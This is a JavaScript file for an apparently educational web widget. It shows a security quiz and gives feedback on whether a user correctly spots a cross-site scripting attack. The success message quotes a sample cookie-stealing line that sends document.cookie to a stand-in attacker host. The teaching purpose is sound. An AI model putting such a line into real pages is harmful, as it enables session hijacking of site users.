/**
 * Interactive Cyber Threat Simulator
 * Provides a live hands-on security challenge inside the Featured Project card.
 */
document.addEventListener('DOMContentLoaded', () => {
  const triggerBtn = document.getElementById('threat-simulator-trigger');
  const demoBtn = document.getElementById('threat-mini-demo-btn');
  const panel = document.getElementById('threat-simulator-panel');
  const closeBtn = document.getElementById('close-sim-btn');
  const optButtons = document.querySelectorAll('.sim-opt-btn');
  const feedbackBox = document.getElementById('sim-feedback-box');

  if (!panel) return;

  function togglePanel() {
    panel.classList.toggle('hidden');
    if (!panel.classList.contains('hidden')) {
      panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }

  if (triggerBtn) triggerBtn.addEventListener('click', togglePanel);
  if (demoBtn) demoBtn.addEventListener('click', togglePanel);
  if (closeBtn) closeBtn.addEventListener('click', togglePanel);

  optButtons.forEach((btn) => {
    btn.addEventListener('click', () => {
      const isCorrect = btn.getAttribute('data-correct') === 'true';

      // Reset options styling
      optButtons.forEach((b) => {
        b.classList.remove('correct', 'incorrect');
      });

      if (isCorrect) {
        btn.classList.add('correct');
        feedbackBox.className = 'threat-sim-feedback success';
        feedbackBox.innerHTML = `
          <strong>✓ Accurate Threat Detection!</strong><br>
          This payload demonstrates an active <em>Cross-Site Scripting (XSS)</em> attack attempting to exfiltrate session cookies via <code>fetch('https://exfil.attacker.xyz/steal?c=' + document.cookie)</code>. The Cyber Threat Awareness Portal teaches developers how to sanitize inputs &amp; implement strict Content Security Policies (CSP).
        `;
      } else {
        btn.classList.add('incorrect');
        feedbackBox.className = 'threat-sim-feedback error';
        feedbackBox.innerHTML = `
          <strong>⚠ Threat Misclassification!</strong><br>
          Notice the injected <code>&lt;script&gt;</code> tag and outbound <code>document.cookie</code> exfiltration request. This is a severe active attack, not benign traffic.
        `;
      }

      feedbackBox.classList.remove('hidden');
    });
  });
});
